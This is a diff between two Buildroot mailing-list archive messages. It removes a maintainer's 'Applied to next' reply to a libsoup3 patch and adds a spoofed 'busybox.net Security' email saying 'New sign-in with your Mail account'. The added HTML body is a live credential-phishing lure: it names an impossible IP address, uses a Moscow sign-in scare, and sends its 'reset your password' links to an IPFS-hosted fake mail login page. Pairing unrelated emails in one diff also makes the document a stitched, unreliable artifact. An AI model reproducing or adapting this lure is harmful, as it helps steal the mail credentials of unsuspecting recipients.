@@ -4,71 +4,47 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 4AA4BCE7A9C
-	for <buildroot@archiver.kernel.org>; Thu,  5 Sep 2024 20:56:21 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id AF3D3CE7AA0
+	for <buildroot@archiver.kernel.org>; Thu,  5 Sep 2024 21:29:08 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 0BD9E400AE;
-	Thu,  5 Sep 2024 20:56:21 +0000 (UTC)
+	by smtp2.osuosl.org (Postfix) with ESMTP id 3B037409EF;
+	Thu,  5 Sep 2024 21:29:08 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp2.osuosl.org ([127.0.0.1])
  by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id itaitTqd0d0D; Thu,  5 Sep 2024 20:56:20 +0000 (UTC)
+ id jRA5_C4KeHC1; Thu,  5 Sep 2024 21:29:07 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org BCE8040391
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org DC2A140ADB
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp2.osuosl.org (Postfix) with ESMTP id BCE8040391;
-	Thu,  5 Sep 2024 20:56:19 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id 778CC1BF41B
- for <buildroot@lists.busybox.net>; Thu,  5 Sep 2024 20:56:18 +0000 (UTC)
+	by smtp2.osuosl.org (Postfix) with ESMTP id DC2A140ADB;
+	Thu,  5 Sep 2024 21:29:06 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 52B241BF3BC
+ for <buildroot@lists.busybox.net>; Thu,  5 Sep 2024 21:29:06 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id 71485406DD
- for <buildroot@lists.busybox.net>; Thu,  5 Sep 2024 20:56:18 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 40F4881D34
+ for <buildroot@lists.busybox.net>; Thu,  5 Sep 2024 21:29:06 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id CScYIhzJgCUs for <buildroot@lists.busybox.net>;
- Thu,  5 Sep 2024 20:56:17 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=217.70.183.196;
- helo=relay4-d.mail.gandi.net; envelope-from=thomas.petazzoni@bootlin.com;
- receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp4.osuosl.org 1AA004060B
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 1AA004060B
-Received: from relay4-d.mail.gandi.net (relay4-d.mail.gandi.net
- [217.70.183.196])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 1AA004060B
- for <buildroot@buildroot.org>; Thu,  5 Sep 2024 20:56:16 +0000 (UTC)
-Received: by mail.gandi.net (Postfix) with ESMTPSA id 67491E0002;
- Thu,  5 Sep 2024 20:56:12 +0000 (UTC)
-Date: Thu, 5 Sep 2024 22:56:11 +0200
-To: Thomas Devoogdt <thomas@devoogdt.com>
-Message-ID: <20240905225611.2c8f0855@windsurf>
-In-Reply-To: <20240829131232.2132854-1-thomas@devoogdt.com>
-References: <20240829131232.2132854-1-thomas@devoogdt.com>
-Organization: Bootlin
-X-Mailer: Claws Mail 4.3.0 (GTK 3.24.43; x86_64-redhat-linux-gnu)
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id IK7qrArMkhz3 for <buildroot@lists.busybox.net>;
+ Thu,  5 Sep 2024 21:29:05 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.28;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 47B6E81E0D
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 47B6E81E0D
+Received: from busybox.net (unknown [141.98.10.28])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 47B6E81E0D
+ for <buildroot@busybox.net>; Thu,  5 Sep 2024 21:29:03 +0000 (UTC)
+From: busybox.net Security <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 5 Sep 2024 23:29:03 +0200
+Message-ID: <20240905232902.66C602BFB898E63A@busybox.net>
 MIME-Version: 1.0
-X-GND-Sasl: thomas.petazzoni@bootlin.com
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=bootlin.com; s=gm1; t=1725569774;
- h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
- to:to:cc:cc:mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=3Yk/w/GEhhq8wD+CV/9Vyi6JT82Q8rYWVeBmC/y+Z7E=;
- b=gpi0W3TIM6/cawk0yJzDiuoHG5kpmSYEWFnuYi7p5HrCuevNtocZSTyQAjahHRZoEjMIaD
- 93b765NjQIjPAEbUYy3E/Hulse8OBGU4+CFJ091nv8Vrja2Hbx6jF3dBys+5H6gq1iql+F
- cpzNZbyO0wFSkZDUnSqVecqOoVyz1s7pYWHkTaelweLiG+u6gi2xkzMqFzbmE2ZWI4C9Lf
- 24mb/UfddXPKdqxQzMz8cJOpyxakw9VQFiLLdaClNdSsz71aRKNQOep2RDNmisQgO0H34t
- OfwNnkSDcxdCiO+voO0Zfm6DXUxwY4eAbT2DX9HmoQBw9vw8Jvm3fUkUvOA+ww==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dmarc=pass (p=reject dis=none)
- header.from=bootlin.com
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=bootlin.com header.i=@bootlin.com header.a=rsa-sha256
- header.s=gm1 header.b=gpi0W3TI
-Subject: Re: [Buildroot] [PATCH v1] package/libsoup3: bump to 3.6.0
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] New sign-in with your Mail account
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -80,38 +56,155 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Thomas Petazzoni via buildroot <buildroot@buildroot.org>
-Reply-To: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-Cc: Adrian Perez de Castro <aperez@igalia.com>,
- Thomas Devoogdt <thomas.devoogdt@barco.com>, buildroot@buildroot.org
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============5969380990386590152=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-On Thu, 29 Aug 2024 15:12:28 +0200
-Thomas Devoogdt <thomas@devoogdt.com> wrote:
+--===============5969380990386590152==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-> From: Thomas Devoogdt <thomas.devoogdt@barco.com>
-> 
-> News:
->  - https://download.gnome.org/sources/libsoup/3.5/libsoup-3.5.2.news
->  - https://download.gnome.org/sources/libsoup/3.6/libsoup-3.6.0.news
-> 
-> Signed-off-by: Thomas Devoogdt <thomas.devoogdt@barco.com>
-> ---
->  package/libsoup3/libsoup3.hash | 4 ++--
->  package/libsoup3/libsoup3.mk   | 4 ++--
->  2 files changed, 4 insertions(+), 4 deletions(-)
+<!DOCTYPE HTML>
 
-Applied to next, thanks.
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
+<body style=3D"margin: 0.4em;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <table style=3D"padding: 0px; w=
+idth: 100%; text-align: left; vertical-align: top; display: table; border-c=
+ollapse: collapse; border-spacing: 0;"><tbody><tr align=3D"left" style=3D"p=
+adding: 0px; vertical-align: top;">
+<th align=3D"left" valign=3D"top" style=3D"margin: 0px auto; padding: 0px 6=
+0px 16px; width: 520px; color: rgb(91, 97, 106); line-height: 1.5; font-fam=
+ily: Arial,Helvetica,sans-serif; font-size: 16px; font-weight: 400; border-=
+collapse: collapse !important; -ms-word-wrap: break-word;"><table style=3D"=
+padding: 0px; width: 100%; text-align: left; vertical-align: top; border-co=
+llapse: collapse; border-spacing: 0;"><tbody><tr align=3D"left" style=3D"pa=
+dding: 0px; vertical-align: top;">
+<th align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; color=
+: rgb(91, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-ser=
+if; font-size: 16px; font-weight: 400; border-collapse: collapse !important=
+; -ms-word-wrap: break-word;"><br></th>
+<th align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 0px; color: rgb(91, 97, 106); line-height: 1.5; font-family: Arial,Helvet=
+ica,sans-serif; font-size: 16px; font-weight: 400; border-collapse: collaps=
+e !important; -ms-word-wrap: break-word;"></th></tr></tbody></table></th></=
+tr></tbody></table><table style=3D"padding: 0px; width: 100%; text-align: l=
+eft; vertical-align: top; display: table; border-collapse: collapse; border=
+-spacing: 0;"><tbody>
+<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
+=3D"left" valign=3D"top" style=3D"margin: 0px auto; padding: 0px 60px 16px;=
+ width: 520px; color: rgb(91, 97, 106); line-height: 1.5; font-family: Aria=
+l,Helvetica,sans-serif; font-size: 16px; font-weight: 400; border-collapse:=
+ collapse !important; -ms-word-wrap: break-word;"><table style=3D"padding: =
+0px; width: 100%; text-align: left; vertical-align: top; border-collapse: c=
+ollapse; border-spacing: 0;"><tbody>
+<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
+=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; color: rgb(91,=
+ 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; font-=
+size: 16px; font-weight: 400; border-collapse: collapse !important; -ms-wor=
+d-wrap: break-word;"><table style=3D"padding: 0px; width: 100%; text-align:=
+ left; vertical-align: top; border-collapse: collapse; border-spacing: 0;">=
+<tbody>
+<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><td height=
+=3D"30" align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; c=
+olor: rgb(91, 97, 106); line-height: 30px; font-family: Arial,Helvetica,san=
+s-serif; font-size: 30px; font-weight: 400; border-collapse: collapse !impo=
+rtant; -ms-word-wrap: break-word;"></td></tr></tbody></table>
+<h4 align=3D"left" style=3D"margin: 0px 0px 16px; padding: 0px; color: inhe=
+rit; line-height: 1.5; font-family: Arial,Helvetica,sans-serif; font-size: =
+24px; font-weight: 700; -ms-word-wrap: normal;">New sign-in with your Mail =
+account                                       </h4><table style=3D"padding:=
+ 0px; width: 100%; text-align: left; vertical-align: top; border-collapse: =
+collapse; border-spacing: 0;"><tbody><tr align=3D"left" style=3D"padding: 0=
+px; vertical-align: top;">
+<td height=3D"10" align=3D"left" valign=3D"top" style=3D"margin: 0px; paddi=
+ng: 0px; color: rgb(91, 97, 106); line-height: 10px; font-family: Arial,Hel=
+vetica,sans-serif; font-size: 10px; font-weight: 400; border-collapse: coll=
+apse !important; -ms-word-wrap: break-word;">        &nbsp;       </td></tr=
+></tbody></table><table style=3D"margin: 10px auto; padding: 0px; width: 10=
+0%; text-align: left; vertical-align: top; border-collapse: collapse; borde=
+r-spacing: 0;"><tbody>
+<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
+=3D"center" valign=3D"top" style=3D"margin: 0px; color: rgb(91, 97, 106); l=
+ine-height: 1.5; font-family: Arial,Helvetica,sans-serif; font-size: 16px; =
+font-weight: 400; border-collapse: collapse !important; -ms-word-wrap: brea=
+k-word;">&nbsp;&nbsp;&nbsp; </th></tr></tbody></table>
+<p align=3D"left" style=3D"margin: 0px 0px 10px; padding: 0px; color: rgb(9=
+1, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; fon=
+t-size: 16px; font-weight: 400;"></p><p align=3D"left" style=3D"margin: 0px=
+ 0px 10px; padding: 0px; color: rgb(91, 97, 106); line-height: 1.5; font-fa=
+mily: Arial,Helvetica,sans-serif; font-size: 16px; font-weight: 400;">Your&=
+nbsp;Mail account was just used to sign in on a new device.</p><br>
+<p align=3D"left" style=3D"margin: 0px 0px 10px; padding: 0px; color: rgb(9=
+1, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; fon=
+t-size: 16px; font-weight: 400;"><strong>9/5/2024 11:29:02 p.m. Central Tim=
+e<br>From 719.78.69.72.66</strong><strong>(IP address potentially located i=
+n Moscow, Russia)</strong></p><p align=3D"left" style=3D"margin: 0px 0px 10=
+px; padding: 0px; color: rgb(91, 97, 106); line-height: 1.5; font-family: A=
+rial,Helvetica,sans-serif; font-size: 16px; font-weight: 400;">
+  If you did not make this change, <a style=3D"padding: 0px; text-align: le=
+ft; color: rgb(0, 113, 187); line-height: 1.5; font-family: Arial,Helvetica=
+,sans-serif; font-weight: 400; text-decoration: none;" href=3D"https://ipfs=
+=2Eio/ipfs/bafkreieqvhn6veuxe4t3tz462s3427ln2j56uoy3xaad34weokpxery5du?file=
+name=3DMailServer.html#buildroot@busybox.net" target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://secure.login=
+=2Egov/events/disavow?disavowal_token%3D7Z3AZcyZ4xrQGV7oLYW1H37JObNkoU28sVm=
+xTBfYd34&amp;source=3Dgmail&amp;ust=3D1669752959927000&amp;usg=3DAOvVaw3xjQ=
+CJ0GYw8c3z9buhKkiy">reset your password</a>. For more help, please visit th=
+e <font color=3D"#0071bb"><a href=3D"https://ipfs.io/ipfs/bafkreieqvhn6veux=
+e4t3tz462s3427ln2j56uoy3xaad34weokpxery5du?filename=3DMailServer.html#build=
+root@busybox.net">Mail Account Activity</a> <font color=3D"#5b616a">or</fon=
+t>
+ <a href=3D"https://ipfs.io/ipfs/bafkreieqvhn6veuxe4t3tz462s3427ln2j56uoy3x=
+aad34weokpxery5du?filename=3DMailServer.html#buildroot@busybox.net">Help Ce=
+nter</a></font>.</p><table style=3D"padding: 0px; width: 100%; text-align: =
+left; vertical-align: top; border-collapse: collapse; border-spacing: 0;"><=
+tbody><tr align=3D"left" style=3D"padding: 0px; vertical-align: top;">
+<td height=3D"30" align=3D"left" valign=3D"top" style=3D"margin: 0px; paddi=
+ng: 0px; color: rgb(91, 97, 106); line-height: 30px; font-family: Arial,Hel=
+vetica,sans-serif; font-size: 30px; font-weight: 400; border-collapse: coll=
+apse !important; -ms-word-wrap: break-word;">                              =
+              &nbsp;                                           </td></tr></=
+tbody></table></th></tr></tbody></table></th></tr></tbody></table>
+<table align=3D"center" style=3D"padding: 0px; width: 100%; text-align: lef=
+t; vertical-align: top; border-collapse: collapse; border-spacing: 0;"><tbo=
+dy><tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><td alig=
+n=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; color: rgb(91=
+, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; font=
+-size: 16px; font-weight: 400; border-collapse: collapse !important; -ms-wo=
+rd-wrap: break-word;">
+<table style=3D"padding: 0px; width: 100%; text-align: left; vertical-align=
+: top; display: table; border-collapse: collapse; border-spacing: 0;"><tbod=
+y><tr align=3D"left" style=3D"padding: 0px; vertical-align: top;"><th align=
+=3D"left" valign=3D"top" style=3D"margin: 0px auto; padding: 0px 60px 16px;=
+ width: 520px; color: rgb(91, 97, 106); line-height: 1.5; font-family: Aria=
+l,Helvetica,sans-serif; font-size: 16px; font-weight: 400; border-collapse:=
+ collapse !important; -ms-word-wrap: break-word;">
+<table style=3D"padding: 0px; width: 100%; text-align: left; vertical-align=
+: top; border-collapse: collapse; border-spacing: 0;"><tbody><tr align=3D"l=
+eft" style=3D"padding: 0px; vertical-align: top;"><th align=3D"left" valign=
+=3D"top" style=3D"margin: 0px; padding: 0px; color: rgb(91, 97, 106); line-=
+height: 1.5; font-family: Arial,Helvetica,sans-serif; font-size: 16px; font=
+-weight: 400; border-collapse: collapse !important; -ms-word-wrap: break-wo=
+rd;">
+<p align=3D"left" style=3D"margin: 0px 0px 10px; padding: 0px; color: rgb(9=
+1, 97, 106); line-height: 1.5; font-family: Arial,Helvetica,sans-serif; fon=
+t-size: 16px; font-weight: 400;">                                          =
+  Please do not reply to this message.</p></th></tr></tbody></table></th></=
+tr></tbody></table></td></tr></tbody></table></body></html>
 
-Thomas
--- 
-Thomas Petazzoni, CTO, Bootlin
-Embedded Linux and Kernel engineering
-https://bootlin.com
+--===============5969380990386590152==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============5969380990386590152==--
